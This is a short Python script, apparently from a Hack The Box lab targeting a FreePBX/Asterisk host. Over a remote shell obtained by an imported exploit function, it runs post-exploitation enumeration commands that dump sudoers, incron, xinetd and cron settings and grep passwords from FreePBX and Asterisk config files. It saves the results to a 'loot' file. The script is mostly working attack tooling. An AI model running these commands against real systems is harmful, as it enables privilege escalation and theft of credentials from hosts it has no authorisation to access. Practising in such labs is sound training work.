#!/usr/bin/env python3
import pathlib
import subprocess
import sys

# Reuse shell from last run - run full chain again via subprocess on enum_privesc get_shell
sys.path.insert(0, "/home/kali/Desktop/htb/Connected/scripts")
from enum_privesc import get_shell  # noqa: E402

EXTRA = [
    ("sudoers", "cat /etc/sudoers 2>/dev/null; echo '---'; ls -la /etc/sudoers.d/; cat /etc/sudoers.d/* 2>/dev/null"),
    ("incron", "ls -la /etc/incron.d/ 2>/dev/null; cat /etc/incron.d/* 2>/dev/null; incrontab -l 2>/dev/null"),
    ("xinetd", "grep -r . /etc/xinetd.d/ 2>/dev/null"),
    ("vega_bridge", "cat /etc/rc.d/init.d/vega_bridge 2>/dev/null; ps aux | grep -i vega"),
    ("port 4000", "curl -s -m 5 http://127.0.0.1:4000/ 2>&1 | head -30; fuser 4000/tcp 2>/dev/null; ps aux | grep 4000"),
    ("AMI 5038", "grep -r '^\\[' /etc/asterisk/manager*.conf 2>/dev/null | head -20"),
    ("mariadb/redis/mongo", "grep -r password /etc/freepbx.conf /etc/amportal.conf 2>/dev/null | head -15"),
    ("fwconsole cron", "ls -la /var/spool/cron; fwconsole --help 2>&1 | head -5; ls /etc/cron* 2>/dev/null"),
    ("z001-updates", "cat /etc/profile.d/z001-updates.sh 2>/dev/null"),
]

def main():
    cmd, url = get_shell()
    out_lines = [f"shell: {url}\n"]
    for title, c in EXTRA:
        print(f"[*] {title}")
        o = cmd(c, timeout=90)
        out_lines.append(f"\n=== {title} ===\n{o}\n")
        print(o[:2000])
    p = pathlib.Path("/home/kali/Desktop/htb/Connected/loot/privesc-enum-extra.txt")
    p.write_text("\n".join(out_lines))
    print(f"[+] {p}")

if __name__ == "__main__":
    main()